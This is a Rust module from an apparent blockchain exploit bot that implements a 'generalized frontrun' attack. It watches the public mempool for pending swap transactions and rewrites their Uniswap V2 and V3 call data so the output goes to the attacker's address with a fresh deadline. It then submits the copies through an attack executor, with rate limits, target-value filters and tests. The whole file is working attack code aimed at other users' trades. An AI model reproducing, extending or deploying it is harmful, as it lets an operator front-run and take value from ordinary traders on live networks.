use crate::executor::{AttackExecutionContext, Executor};
use crate::solver::objectives::{ExploitParams, ExploitStep};
use alloy::consensus::Transaction;
use alloy::providers::{Provider, ProviderBuilder};
use alloy::sol_types::SolCall;
use anyhow::Result;
use revm::primitives::{Address, Bytes, U256};
use std::str::FromStr;
use std::sync::{
    atomic::{AtomicU64, Ordering},
    Arc,
};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::sync::Semaphore;
use tokio_stream::StreamExt;

const DEFAULT_MIRROR_MAX_PENDING_PER_SEC: usize = 12;
const DEFAULT_MIRROR_MAX_CONCURRENT: usize = 2;
const DEFAULT_MIRROR_EXECUTION_TIMEOUT_MS: u64 = 1_800;
const DEFAULT_MIRROR_INPUT_MAX_BYTES: usize = 2_048;
const DEFAULT_MIRROR_DEADLINE_SECS: u64 = 90;
const DEFAULT_MIRROR_REQUIRE_TRACKED_TARGET: bool = true;
static LAST_MIRROR_NOW_MS: AtomicU64 = AtomicU64::new(1);

alloy::sol! {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params)
        external
        payable
        returns (uint256 amountOut);
}

fn now_ms() -> u64 {
    let sample = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|d| d.as_millis() as u64);
    normalize_mirror_now_ms(sample)
}

fn normalize_mirror_now_ms(sample_ms: Option<u64>) -> u64 {
    let mut prev = LAST_MIRROR_NOW_MS.load(Ordering::Relaxed);
    loop {
        let normalized = sample_ms.unwrap_or(prev).max(prev).max(1);
        match LAST_MIRROR_NOW_MS.compare_exchange_weak(
            prev,
            normalized,
            Ordering::Relaxed,
            Ordering::Relaxed,
        ) {
            Ok(_) => return normalized,
            Err(actual) => prev = actual,
        }
    }
}

fn mirror_enabled() -> bool {
    std::env::var("GENERALIZED_FRONTRUN_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(false)
}

fn load_mirror_max_pending_per_sec() -> usize {
    std::env::var("GENERALIZED_FRONTRUN_MAX_PENDING_PER_SEC")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_MIRROR_MAX_PENDING_PER_SEC)
        .clamp(1, 2_000)
}

fn load_mirror_max_concurrent() -> usize {
    std::env::var("GENERALIZED_FRONTRUN_MAX_CONCURRENT")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_MIRROR_MAX_CONCURRENT)
        .clamp(1, 32)
}

fn load_mirror_execution_timeout_ms() -> u64 {
    std::env::var("GENERALIZED_FRONTRUN_EXECUTION_TIMEOUT_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .unwrap_or(DEFAULT_MIRROR_EXECUTION_TIMEOUT_MS)
        .clamp(200, 30_000)
}

fn load_mirror_input_max_bytes() -> usize {
    std::env::var("GENERALIZED_FRONTRUN_INPUT_MAX_BYTES")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_MIRROR_INPUT_MAX_BYTES)
        .clamp(4, 16_384)
}

fn load_mirror_deadline_secs() -> u64 {
    std::env::var("GENERALIZED_FRONTRUN_MIRROR_DEADLINE_SECS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .unwrap_or(DEFAULT_MIRROR_DEADLINE_SECS)
        .clamp(15, 1_800)
}

fn load_mirror_require_tracked_target() -> bool {
    std::env::var("GENERALIZED_FRONTRUN_REQUIRE_TRACKED_TARGET")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(DEFAULT_MIRROR_REQUIRE_TRACKED_TARGET)
}

fn load_mirror_min_target_tvl_wei() -> U256 {
    std::env::var("GENERALIZED_FRONTRUN_MIN_TARGET_TVL_WEI")
        .ok()
        .and_then(|raw| U256::from_str(raw.trim()).ok())
        .unwrap_or(U256::ZERO)
}

fn mirror_target_allowed(
    target: Address,
    require_tracked_target: bool,
    min_target_tvl_wei: &U256,
) -> bool {
    let cached_tvl = crate::scanner::target_capital_estimate_eth_wei(target);
    if require_tracked_target && cached_tvl.is_none() {
        return false;
    }

    if min_target_tvl_wei.is_zero() {
        return true;
    }

    cached_tvl
        .map(|value| value >= *min_target_tvl_wei)
        .unwrap_or(false)
}

fn replacement_deadline(deadline_secs: u64) -> U256 {
    let now_secs = now_ms() / 1_000;
    U256::from(now_secs.saturating_add(deadline_secs))
}

fn looks_like_univ3_path(path: &alloy::primitives::Bytes) -> bool {
    let len = path.len();
    len >= 43 && (len - 20).is_multiple_of(23)
}

fn rewrite_mirror_call_data(
    input: &Bytes,
    recipient: Address,
    deadline_secs: u64,
) -> Option<(Bytes, U256)> {
    if input.len() < 4 {
        return None;
    }

    let replacement_deadline = replacement_deadline(deadline_secs);

    if input
        .as_ref()
        .starts_with(&swapExactTokensForTokensCall::SELECTOR)
    {
        let mut decoded = swapExactTokensForTokensCall::abi_decode(input.as_ref(), true).ok()?;
        if decoded.path.len() < 2 {
            return None;
        }
        let min_out = decoded.amountOutMin;
        decoded.to = recipient;
        decoded.deadline = replacement_deadline;
        return Some((Bytes::from(decoded.abi_encode()), min_out));
    }

    if input.as_ref().starts_with(&exactInputCall::SELECTOR) {
        let mut decoded = exactInputCall::abi_decode(input.as_ref(), true).ok()?;
        if !looks_like_univ3_path(&decoded.params.path) {
            return None;
        }
        let min_out = decoded.params.amountOutMinimum;
        decoded.params.recipient = recipient;
        decoded.params.deadline = replacement_deadline;
        return Some((Bytes::from(decoded.abi_encode()), min_out));
    }

    None
}

fn build_mirror_params(to: Address, input: &Bytes, min_out: Option<U256>) -> ExploitParams {
    let expected_profit = if min_out.unwrap_or(U256::ZERO).is_zero() {
        U256::from(1u64)
    } else {
        U256::from(2u64)
    };
    ExploitParams {
        flash_loan_amount: U256::ZERO,
        flash_loan_token: Address::ZERO,
        flash_loan_provider: Address::ZERO,
        flash_loan_legs: Vec::new(),
        steps: vec![ExploitStep {
            target: to,
            call_data: input.clone(),
            execute_if: None,
        }],
        expected_profit: Some(expected_profit),
        block_offsets: None,
    }
}

pub async fn start_generalized_frontrun(
    ws_url: &str,
    executor: Arc<Executor>,
    mut shutdown_rx: tokio::sync::broadcast::Receiver<()>,
) -> Result<()> {
    if !mirror_enabled() {
        tracing::info!("[MIRROR] Disabled (GENERALIZED_FRONTRUN_ENABLED=0).");
        return Ok(());
    }

    let provider = ProviderBuilder::new()
        .on_ws(alloy::transports::ws::WsConnect::new(ws_url))
        .await?;
    let provider = Arc::new(provider);

    let latest_head = Arc::new(AtomicU64::new(0));
    if let Ok(Ok(head)) =
        tokio::time::timeout(Duration::from_millis(1_000), provider.get_block_number()).await
    {
        latest_head.store(head, Ordering::Relaxed);
    }

    {
        let provider_head = provider.clone();
        let latest_head_task = latest_head.clone();
        let mut shutdown_rx_head = shutdown_rx.resubscribe();
        tokio::spawn(async move {
            let sub = match provider_head.subscribe_blocks().await {
                Ok(sub) => sub,
                Err(err) => {
                    tracing::warn!("[MIRROR] Block-head subscription unavailable: {}", err);
                    return;
                }
            };
            let mut stream = sub.into_stream();
            loop {
                tokio::select! {
                    _ = shutdown_rx_head.recv() => break,
                    maybe_block = stream.next() => {
                        let Some(block) = maybe_block else { break; };
                        latest_head_task.store(block.number, Ordering::Relaxed);
                    }
                }
            }
        });
    }

    let max_pending_per_sec = load_mirror_max_pending_per_sec();
    let max_concurrent = load_mirror_max_concurrent();
    let execution_timeout_ms = load_mirror_execution_timeout_ms();
    let input_max_bytes = load_mirror_input_max_bytes();
    let mirror_deadline_secs = load_mirror_deadline_secs();
    let require_tracked_target = load_mirror_require_tracked_target();
    let min_target_tvl_wei = load_mirror_min_target_tvl_wei();
    let permits = Arc::new(Semaphore::new(max_concurrent));
    let mirror_recipient = executor.attacker_address();

    let sub = provider.subscribe_full_pending_transactions().await?;
    let mut stream = sub.into_stream();
    let mut window_start_ms = now_ms();
    let mut seen_in_window = 0usize;

    tracing::info!(
        "[MIRROR] Enabled: max_pending_per_sec={} max_concurrent={} timeout={}ms input_max_bytes={} mirror_deadline_secs={} require_tracked_target={} min_target_tvl_wei={}",
        max_pending_per_sec,
        max_concurrent,
        execution_timeout_ms,
        input_max_bytes,
        mirror_deadline_secs,
        require_tracked_target,
        min_target_tvl_wei
    );

    loop {
        tokio::select! {
            _ = shutdown_rx.recv() => {
                tracing::info!("[MIRROR] Shutdown signal received.");
                break;
            }
            maybe_tx = stream.next() => {
                let Some(tx) = maybe_tx else { continue; };
                let now = now_ms();
                if now.saturating_sub(window_start_ms) >= 1_000 {
                    window_start_ms = now;
                    seen_in_window = 0;
                }
                if seen_in_window >= max_pending_per_sec {
                    continue;
                }

                let Some(to_alloy) = tx.to() else {
                    continue;
                };
                let input = tx.input();
                if input.len() < 4 || input.len() > input_max_bytes {
                    continue;
                }
                let to = Address::from_slice(to_alloy.as_slice());
                if !mirror_target_allowed(to, require_tracked_target, &min_target_tvl_wei) {
                    continue;
                }

                let permit = match permits.clone().try_acquire_owned() {
                    Ok(permit) => permit,
                    Err(_) => continue,
                };

                seen_in_window = seen_in_window.saturating_add(1);
                let raw_input = Bytes::from(input.to_vec());
                let (mirrored_input, decoded_min_out) =
                    match rewrite_mirror_call_data(&raw_input, mirror_recipient, mirror_deadline_secs) {
                        Some((rewired, min_out)) => (rewired, Some(min_out)),
                        None => (raw_input, None),
                    };
                let params = build_mirror_params(to, &mirrored_input, decoded_min_out);
                let target_solve_block = latest_head.load(Ordering::Relaxed);
                if target_solve_block == 0 {
                    continue;
                }

                let exec = executor.clone();
                tokio::spawn(async move {
                    let _permit = permit;
                    let _ = tokio::time::timeout(
                        Duration::from_millis(execution_timeout_ms),
                        exec.execute_attack(
                            params,
                            to,
                            AttackExecutionContext {
                                target_solve_block,
                                solve_duration_ms: 0,
                                require_late_solve_preflight: false,
                                solve_completed_ms: now_ms(),
                                tip_auto_scale_contested: false,
                                verified_shadow_report: None,
                            },
                        ),
                    )
                    .await;
                });
            }
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    static ENV_LOCK: Mutex<()> = Mutex::new(());

    #[test]
    fn test_normalize_mirror_now_ms_never_returns_zero() {
        super::LAST_MIRROR_NOW_MS.store(0, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(super::normalize_mirror_now_ms(None), 1);
        assert!(super::normalize_mirror_now_ms(Some(0)) >= 1);
    }

    #[test]
    fn test_normalize_mirror_now_ms_clamps_clock_regressions() {
        super::LAST_MIRROR_NOW_MS.store(200, std::sync::atomic::Ordering::SeqCst);
        assert_eq!(super::normalize_mirror_now_ms(Some(150)), 200);
        assert_eq!(super::normalize_mirror_now_ms(Some(260)), 260);
    }

    #[test]
    fn test_load_mirror_require_tracked_target_defaults_true() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "GENERALIZED_FRONTRUN_REQUIRE_TRACKED_TARGET";
        let old = std::env::var(key).ok();
        std::env::remove_var(key);
        assert!(super::load_mirror_require_tracked_target());
        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_load_mirror_min_target_tvl_wei_invalid_falls_back_to_zero() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "GENERALIZED_FRONTRUN_MIN_TARGET_TVL_WEI";
        let old = std::env::var(key).ok();

        std::env::set_var(key, "12345");
        assert_eq!(
            super::load_mirror_min_target_tvl_wei(),
            U256::from(12_345u64)
        );

        std::env::set_var(key, "not-a-number");
        assert_eq!(super::load_mirror_min_target_tvl_wei(), U256::ZERO);

        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }

    #[test]
    fn test_mirror_target_allowed_enforces_tracked_target_and_tvl_floor() {
        let tracked = Address::from([0x91; 20]);
        crate::scanner::record_target_capital_estimate(tracked, U256::from(5_000u64));

        assert!(super::mirror_target_allowed(
            tracked,
            true,
            &U256::from(1_000u64)
        ));
        assert!(!super::mirror_target_allowed(
            tracked,
            true,
            &U256::from(10_000u64)
        ));

        let untracked = (1u8..=u8::MAX)
            .map(|b| Address::from([b; 20]))
            .find(|addr| crate::scanner::target_capital_estimate_eth_wei(*addr).is_none())
            .expect("expected at least one untracked address");

        assert!(!super::mirror_target_allowed(untracked, true, &U256::ZERO));
        assert!(super::mirror_target_allowed(untracked, false, &U256::ZERO));
        assert!(!super::mirror_target_allowed(
            untracked,
            false,
            &U256::from(1u64)
        ));
    }
}
